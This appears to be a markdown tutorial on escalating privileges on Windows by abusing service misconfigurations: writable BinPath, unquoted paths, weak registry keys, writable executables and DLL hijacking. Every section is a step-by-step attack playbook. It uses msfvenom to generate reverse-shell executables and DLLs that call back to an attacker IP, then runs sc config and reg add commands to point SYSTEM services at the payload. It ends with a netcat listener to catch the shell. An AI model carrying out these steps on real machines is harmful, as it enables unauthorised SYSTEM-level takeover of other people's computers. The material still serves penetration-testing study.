# Windows Service Exploitation

### 🔧 **Windows Services**

Windows uses *services* to run background programs (like antivirus, updates, etc.). These services are controlled by a system tool called **SCM (Service Control Manager)**.

Each service:

- Runs a specific `.exe` file (called **BINARY_PATH_NAME**).
- Uses a specific user account (like `LocalSystem`, `svcuser1`, etc.).
- Has **permissions (DACL)** to control who can start, stop, or change it.

### What is a Service?

A **service** is a background process running on Windows, similar to a **daemon** on Linux. It starts automatically or on-demand and runs without a user interface, typically providing essential system or application functions.

### Misconfigurations

1. Modifiable Binary Path (BinPath)
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Executable Permissions
5. DLL Hijacking

___ 

# Escalation **via BinPath**

Some Windows services allow users to change their executable path (BinPath). If you can modify this path, you can replace the service with a malicious executable (like a reverse shell). When the service restarts, it runs your payload with high privileges (often SYSTEM).

### **1. Find Vulnerable Services**

Run **WinPEAS** or **PowerUp.ps1** to find services with weak permissions:

<img width="1124" height="95" alt="image" src="https://github.com/user-attachments/assets/df1185df-d5f6-4c91-938c-ffbd916b36a8" />

OR

<img width="962" height="71" alt="image" src="https://github.com/user-attachments/assets/4adb4cc2-0f89-42dd-8cd4-d013c2b6c810" />

Look for services with:

✔ **SERVICE_CHANGE_CONFIG** permission

✔ **Writable BinPath**

*(Example: Suppose `daclsvc`  is vulnerable here.)*

### **2. Check Permissions**

Use **AccessChk** to confirm you can modify the service:

```bash
.\accesschk.exe /accepteula -uwcqv user dsclavc
```

<img width="973" height="263" alt="image" src="https://github.com/user-attachments/assets/0db2af6e-3309-4b0c-8402-bfe547b5d526" />

✅ **You need these permissions:**

- **`SERVICE_CHANGE_CONFIG`** (to modify the service)
- **`SERVICE_START/STOP`** (to restart it)

*(If missing, try another service!)*

### **3. Check Service Details (Optional)**

```
sc qc dsclavc        # Check executable path & privileges
sc query dsclavc     # Check if service is running
```

🔹 **If it runs as `LocalSystem` → Perfect!**

Here you can see the `SERVICE_START_NAME` is LocalSystem it means the service runs with **very high privileges** and the `BINARY_PATH_NAME`  which you are going to modify

<img width="1241" height="482" alt="image" src="https://github.com/user-attachments/assets/ca6be8b8-a465-48ca-9b63-0ab47ac25b86" />

### **4. Generate a Reverse Shell**

On your Kali machine:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
```

Upload **`evil.exe`** to the victim machine.

### **5. Change the Service BinPath**

```
sc config dsclavc binpath= "C:\Temp\evil.exe"
```

*(Replace **`C:\Temp\evil.exe`** with your payload path.)*

### **6. Restart the Service**

```
net stop dsclavc
net start dsclavc
```

🎉 **If successful, you get a reverse shell with SYSTEM privileges!**

___

# Escalation via Unquoted Service Path

## **What is an Unquoted Service Path?**

When a Windows service runs with **high privileges** (like SYSTEM) but its executable path **contains spaces without quotes**, it becomes vulnerable. Windows searches for the executable in a weird way that we can exploit.

<img width="887" height="364" alt="image" src="https://github.com/user-attachments/assets/6fc26487-0383-4872-8c98-fc43ac137f8e" />

### **Example of the Problem:**

Suppose the service binary path is:

```
mathematica
CopyEdit
C:\Program Files\Unquoted Path Service\Common Files\servicename.exe

```

**Because there are no quotes**, Windows will try to find the executable by checking these paths in order:

1. `C:\Program.exe`
2. `C:\Program Files.exe`
3. `C:\Program Files\Unquoted.exe`
4. `C:\Program Files\Unquoted Path.exe`
5. `C:\Program Files\Unquoted Path Service.exe`
6. `C:\Program Files\Unquoted Path Service\Common.exe`
7. `C:\Program Files\Unquoted Path Service\Common Files.exe`
8. `C:\Program Files\Unquoted Path Service\Common Files\servicename.exe`

If you have write permission in any of those folders, you can place a malicious executable (with the exact name the system looks for) and trick the service into running your code.

### How to find unquoted services?

- Use **PowerUp.ps1** (a PowerShell script for privilege escalation enumeration)
- Use **WinPEAS.exe** (an automated Windows privilege escalation tool)

These tools will identify unquoted service paths on the system.

<img width="894" height="50" alt="image" src="https://github.com/user-attachments/assets/14eb0ab6-7402-4653-bcaf-766857af123b" />

*(Example: Found service **`unquotedsvc`** with path **`C:\Program Files\Bad Service\app.exe`**)*

### **2. Check Write Permissions**

Verify you can write to one of the folders in the path Try it for all the combination:

```
icacls "C:\Program Files"
```

If you see **`(M)`** or **`(F)`** next to your username, you can write files there!

**`(F)` - Full Control**

**`(M)` - Modify**

### **3. Create Malicious Payload**

On your Kali machine:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
```

Upload **`evil.exe`** to the victim machine.

### **4. Place Payload in Vulnerable Location**

Since Windows searches for **`Program.exe`** first, we can:

```
copy evil.exe "C:\Program.exe"
```

*(If **`C:\Program Files`** is writable, use **`"C:\Program Files\Vulnerable.exe"`** instead.)*

### **5. Restart the Service**

```
net stop unquotedsvc
net start unquotedsvc
```

💥 **If successful, you get a reverse shell with SYSTEM privileges!**

___

# **Escalation via Insecure Registry Permissions**

### 🔍 What is it?

When a Windows service is created, a registry key is added at:

```
KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

This key includes information like the **ImagePath** (the path to the executable the service runs).

If a user (other than an admin) has **write permissions** to this registry key, they can **modify the ImagePath** to point to a malicious executable — gaining elevated access when the service starts.

here you can see one service with details and ImagePath

<img width="892" height="352" alt="image" src="https://github.com/user-attachments/assets/f7c2a3b6-3443-49b2-bfe8-084102153111" />

## **Step-by-Step Exploitation Guide**

### **1. Find Vulnerable Service**

Run **WinPEAS** or **PowerUp.ps1** to find services with weak permissions:

<img width="903" height="71" alt="image" src="https://github.com/user-attachments/assets/0dd20912-e4b8-4a24-8e3e-40f062f16698" />

*(Example: Found service `regsvc`* 

### **2.** Check Registry Permissions

Run this to check if you have read/write access to the registry key:

```bash
accesschk.exe /accepteula -uvwqk "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc"
```

Look for `W` write access for groups like:

- `Users`
- `Everyone`
- `NT AUTHORITY\INTERACTIVE` (means any logged-in user can modify it)

Then Check if you can start/stop the service:

```
accesschk.exe /accepteula -ucqv user regsvc
```

✅ **You need:**

- **`SERVICE_START`**
- **`SERVICE_STOP`**

### **3. Check Current ImagePath**

View the current executable path:

```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc"
```

Note the **`ImagePath`** value.

### **4. Create Malicious Payload**

Generate a reverse shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
```

Upload to victim machine (e.g., **`C:\Temp\evil.exe`**).

### **5. Modify the Registry**

Change the ImagePath to your payload:

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc" /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\evil.exe" /f
```

### **6. Trigger the Payload**

Restart the service:

```
net stop regsvc
net start regsvc
```

🎉 **You should receive a SYSTEM shell!**

___

# Escalation via Insecure Service Executable

If a service’s **executable file** (`.exe`) is **writable by non-admin users**, it becomes a privilege escalation risk.

You can **replace the original executable with a malicious one**, and when the service is restarted, it will run **your payload** — potentially with **SYSTEM privileges**.

### 🧰 Enumeration Tools

- **PowerUp.ps1** (PowerShell script)
- **WinPEAS.exe** (automated enumeration tool)

After running one of these, look for Files highlighted as **world-writable** (accessible by Everyone or your user)

<img width="900" height="45" alt="image" src="https://github.com/user-attachments/assets/feb952d2-3ad3-4a63-ac47-094ab57c9065" />


*(Example: Found executable* `C:\Program Files\Files Permissions Service\filepermservice.exe` **

### 🔐 Step 1: Check File Permissions

Use `accesschk` to see if the executable is writable:

```bash
accesschk.exe /accepteula -quvw "C:\Program Files\Files Permissions Service\filepermservice.exe"
```

Look for `W` write access granted to:

- `Users`
- `Everyone`
- Your own user

<img width="794" height="254" alt="image" src="https://github.com/user-attachments/assets/9069aca8-b8c7-4684-a1cc-50a262bd9f66" />


### 🔧 Step 2: Can You Start/Stop the Service?

Check if you can control the service:

```bash
accesschk.exe /accepteula -ucqv filepermsvc
```

Make sure you have:

- `SERVICE_START`
- `SERVICE_STOP`

### 💣 Step 3: Create a Malicious Executable

Generate a reverse shell payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.132 LPORT=4444 -f exe -o reverse.exe
```

### 📤 Step 4: Replace the Service Executable

Copy `reverse.exe` to the victim machine and overwrite the vulnerable service executable:

Replace:

`filepermservice.exe`

With:

`reverse.exe` with original name `filepermservice.exe`

Make sure the name and path match exactly. 

*(Backup original executable first if needed)*

### 🚀 Step 5: Restart the Service

```bash
net stop filepermsvc
net start filepermsvc
```

Once restarted, it will run **your reverse shell payload**, giving you elevated access (usually SYSTEM).

___

## 🎯 What Is DLL Hijacking?

When a Windows service or program **searches for a DLL**, it looks in certain folders in a specific order.

If it **can’t find the DLL in the expected path**, it keeps searching — and if **you can place a malicious DLL in one of those locations**, it will get loaded and executed with **the same privileges as the service (e.g., SYSTEM)**.

---

## 🔍 Enumeration (Find Hijackable DLLs)

### 🔧 Tool: WinPEAS.exe

Run `WinPEAS` on the target machine. Look for sections like:

- `Potential DLL Hijacking`
- `Service Executables Missing DLLs`
- `Writable Directories in PATH`

<img width="858" height="198" alt="image" src="https://github.com/user-attachments/assets/882de4ce-cf47-4d21-85c2-579e0ddec46a" />


*(Example: Found service **`dllsvc`**)*

## ✅ Check If You Can Exploit

### Step 1: Check Service Permissions

```bash
accesschk.exe /accepteula -quvw user dllsvc
```

Check for:

- `SERVICE_START`
- `SERVICE_STOP`

If you have these, you can control the service.

<img width="860" height="217" alt="image" src="https://github.com/user-attachments/assets/88469c21-fe26-4431-9bc1-0f8716bf9d6c" />


### **2. Verify Service Control**

```
sc qc dllsvc
```

🔹 **If it runs as `LocalSystem` → Perfect!**

Here you can see the `SERVICE_START_NAME` is LocalSystem it means the service runs with **very high privileges**

<img width="863" height="272" alt="image" src="https://github.com/user-attachments/assets/bf2b8b31-e5eb-4169-96c5-30615709a7d1" />


### **3. Analyze with Process Monitor**

1. Download Process Monitor (ProcMon) from Microsoft
2. Run as Administrator
3. Set filters:
    - Process Name: **`dllsvc.exe`**
    - Operation: **`CreateFile`**
    - Result: **`NAME NOT FOUND`**
4. Start capturing and run:

```
net start dllsvc
```

### **4. Identify Missing DLLs**

In ProcMon, look for:

```
PATH\NOT\FOUND\example.dll
```

Note the exact DLL name and search paths.

<img width="889" height="774" alt="image" src="https://github.com/user-attachments/assets/c3d403b0-3c7d-4e7b-9bad-6761b65ea020" />


### **5. Create Malicious DLL**

Generate a malicious DLL payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o evil.dll
```

Rename to match the missing DLL (e.g., **`example.dll`**)

### **6. Plant the DLL**

Copy to a writable location that appears earlier in the DLL search order:

```
copy evil.dll "C:\Program Files\VulnerableService\missing.dll"
```

### **7. Trigger the Exploit**

```
net stop dllsvc
net start dllsvc
```

### **8. Catch the Shell**

```
nc -nvlp 4444
```

💥 You should receive a reverse shell with the service's privileges!
